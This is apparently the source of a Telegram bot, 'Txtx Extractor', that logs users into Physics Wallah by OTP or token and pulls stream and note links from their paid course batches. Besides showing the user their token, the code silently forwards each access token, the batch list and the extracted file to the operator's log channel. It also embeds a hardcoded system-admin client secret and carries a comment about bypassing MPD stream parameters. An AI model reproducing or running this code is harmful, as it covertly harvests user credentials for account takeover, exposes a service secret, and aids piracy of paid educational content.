import requests
import asyncio
from pyrogram import Client, filters
import requests, os, sys, re
import math
import json, asyncio
from config import CHANNEL_ID
import subprocess
from datetime import datetime
import pytz  # 🔥 Imported pytz for Standard Asia/Kolkata timezone mapping
from Extractor import app
from pyrogram import filters
from subprocess import getstatusoutput
import logging

log_channel = CHANNEL_ID

@app.on_message(filters.command(["today"]))
async def pw_login(app, message):
    try:
        query_msg = await app.ask(
            chat_id=message.chat.id,
            text="🔐 **Enter your PW Mobile No. (without country code) or your Login Token:")
                 
        user_input = query_msg.text.strip()

        if user_input.isdigit():
            mob = user_input
            payload = {
                "username": mob,
                "countryCode": "+91",
                "organizationId": "5eb393ee95fab7468a79d189"
            }
            headers = {
                "client-id": "5eb393ee95fab7468a79d189",
                "client-version": "12.84",
                "Client-Type": "MOBILE",
                "randomId": "e4307177362e86f1",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json"
            }
            
            await app.send_message(message.chat.id, "🔄 **Sending OTP... Please wait!**")
            otp_response = requests.post(
                "https://api.penpencil.co/v1/users/get-otp?smsType=0", 
                headers=headers, 
                json=payload
            ).json()

            if not otp_response.get("success"):
                await message.reply_text("❌ **Invalid Mobile Number! Please provide a valid PW login number.**")
                return
            
            await app.send_message(message.chat.id, "✅ **OTP sent successfully! Please enter your OTP:**")
            otp_msg = await app.ask(message.chat.id, text="🔑 **Enter the OTP you received:**")
            otp = otp_msg.text.strip()

            token_payload = {
                "username": mob,
                "otp": otp,
                "client_id": "system-admin",
                "client_secret": "KjPXuAVfC5xbmgreETNMaL7z",
                "grant_type": "password",
                "organizationId": "5eb393ee95fab7468a79d189",
                "latitude": 0,
                "longitude": 0
            }
            
            await app.send_message(message.chat.id, "🔄 **Verifying OTP... Please wait!**")
            token_response = requests.post(
                "https://api.penpencil.co/v3/oauth/token", 
                data=token_payload
            ).json()
            
            token = token_response.get("data", {}).get("access_token")
            if not token:
                await message.reply_text("❌ **Login failed! Invalid OTP.**")
                return
            
            dl = (f"✅ ** PW Login Successful!**\n\n🔑 **Here is your token:**\n`{token}`")
            await message.reply_text(f"✅ **Login Successful!**\n\n🔑 **Here is your token:**\n`{token}`")
            await app.send_message(log_channel, dl)
        
        elif user_input.startswith("e"):
            token = user_input
        else:
            await message.reply_text("❌ **Invalid input! Please provide a valid mobile number or token.**")
            return

        # Working Termux/Requests header block configuration
        headers = {
            "client-id": "5eb393ee95fab7468a79d189",
            "client-type": "WEB",
            "Authorization": f"Bearer {token}",
            "client-version": "3.3.0",
            "randomId": "04b54cdb-bf9e-48ef-974d-620e21bd3e23",
            "Accept": "application/json, text/plain, */*"
        }
        
        batch_response = requests.get(
            "https://api.penpencil.co/v3/batches/my-batches?mode=1&amount=paid&page=1", 
            headers=headers
        ).json()
        
        batches = batch_response.get("data", [])
        if not batches:
            await message.reply_text("❌ **No batches found for this account.**")
            return

        batch_text = "📚 **Your Batches:**\n\n"
        batch_map = {}
        for batch in batches:
            bi = batch.get("_id")
            bn = batch.get("name")
            batch_text += f"📖 `{bi}` → **{bn}**\n"
            batch_map[bi] = bn

        query_msg = await app.send_message(
            chat_id=message.chat.id, 
            text=batch_text + "\n\n💡 **Please enter the Course ID to continue:**",
            reply_markup=None
        )
        
        target_id_msg = await app.ask(message.chat.id, text="🆔 **Enter the Course ID here:**")
        target_id = target_id_msg.text.strip()

        if target_id not in batch_map:
            await message.reply_text("❌ **Invalid Course ID! Please try again.**")
            return

        batch_name = batch_map[target_id]
        filename = f"{batch_name.replace('/', '_').replace(':', '_').replace('|', '_')}.txt"

        # Asking target date for schedule extraction
        date_msg = await app.ask(
            chat_id=message.chat.id,
            text="📅 **Enter Target Date for Schedule Extraction (`YYYY-MM-DD`):**\n\n💡 *Tip: Direct 'Today' likhne par automatic aaj ka content extract hoga.*"
        )
        date_input = date_msg.text.strip().lower()

        # 🔥 Timezone Fix Layer (Asia/Kolkata Standard Synchronization)
        if date_input == "today" or not date_input:
            IST = pytz.timezone("Asia/Kolkata")
            target_date = datetime.now(IST).strftime("%Y-%m-%d")
        else:
            if not re.match(r'^\d{4}-\d{2}-\d{2}$', date_input):
                await message.reply_text("❌ **Incorrect date format! Please provide in YYYY-MM-DD layout.**")
                return
            target_date = date_input

        await app.send_message(
            chat_id=message.chat.id, 
            text=f"🕵️ **Fetching Schedule Details for Date `{target_date}` of Batch:** **{batch_name}**... Please wait!"
        )

        with open(filename, 'w') as f:
            # ONLY WEEKLY SCHEDULE EXTRACTION PIPELINE (Core extraction engine)
            schedule_url = f"https://api.penpencil.co/v2/batches/{target_id}/weekly-schedules?batchId={target_id}&startDate={target_date}&endDate={target_date}&page=1"
            try:
                sched_resp = requests.get(schedule_url, headers=headers).json()
                schedules = sched_resp.get("data", []) or []
                
                if schedules:
                    f.write(f"━━━━✦ SCHEDULED CONTENT ({target_date}) ✦━━━━\n")
                    for s_item in schedules:
                        el_type = s_item.get("type", "UNKNOWN")
                        
                        # Processing Schedule Lecture Containers
                        if el_type == "LECTURE":
                            v_details = s_item.get("videoDetails", {})
                            if not v_details: 
                                continue
                            
                            topic = v_details.get("topic", "No Title Specified").replace(":", "_")
                            p_id = v_details.get("batchId") or target_id
                            c_id = v_details.get("_id") or v_details.get("id") or ""
                            
                            v_nested = v_details.get("videoDetails", {})
                            raw_stream = ""
                            if isinstance(v_nested, dict) and v_nested:
                                raw_stream = v_nested.get("videoUrl") or v_details.get("url") or ""
                                
                            if "cloudfront.net" in raw_stream:
                                base_url = raw_stream.split("?")[0]
                                # Raw MPD parameters bypass injection logic
                                formatted_url = f"{base_url}&parentId={p_id}&childId={c_id}"
                                f.write(f"{topic}:{formatted_url}\n")
                            
                            # Attachment parsing layers inside schedules
                            for hw in v_details.get("homeworkIds", []):
                                hw_title = hw.get("topic", topic).replace(":", "_")
                                for attach in hw.get("attachmentIds", []):
                                    b_url = attach.get("baseUrl", "")
                                    key = attach.get("key", "")
                                    if b_url:
                                        f.write(f"{hw_title} Notes:{b_url}{key}\n")
                                        
                        # Processing Standalone Notes Static PDF files
                        elif el_type == "NOTES":
                            n_details = s_item.get("notesDetails", {})
                            if not n_details:
                                continue
                            
                            topic = n_details.get("topic", "Notes Packet").replace(":", "_")
                            for hw in n_details.get("homeworkIds", []):
                                hw_title = hw.get("topic", topic).replace(":", "_")
                                for attach in hw.get("attachmentIds", []):
                                    b_url = attach.get("baseUrl", "")
                                    key = attach.get("key", "")
                                    if b_url:
                                        f.write(f"{hw_title}:{b_url}{key}\n")
                else:
                    f.write(f"❌ No schedules found for date: {target_date}\n")
            except Exception as sched_err:
                logging.error(f"Schedule extraction failed: {sched_err}")
                f.write(f"❌ Error fetching schedule: {str(sched_err)}\n")

        up = (f"**Login Successful for PW:** `{token}`")
        captionn = (f" App Name : Physics Wallah \n\n PURCHASED BATCHES : {batch_text}")
        await app.send_document(
            chat_id=message.chat.id, 
            document=filename, 
            caption=f"App Name: PHYSICS WALLAH \n\n 🆔** Batch ID:** **{target_id}**\n📂 **Batch:** **{batch_name}**✅\n \n\n  **╾───• Txtx Extractor •───╼** "
        )
        await app.send_document(log_channel, document=filename, caption=captionn)
        await app.send_message(log_channel, up)

    except Exception as e:
        await message.reply_text(f"❌ **An error occurred:** `{str(e)}`")
      
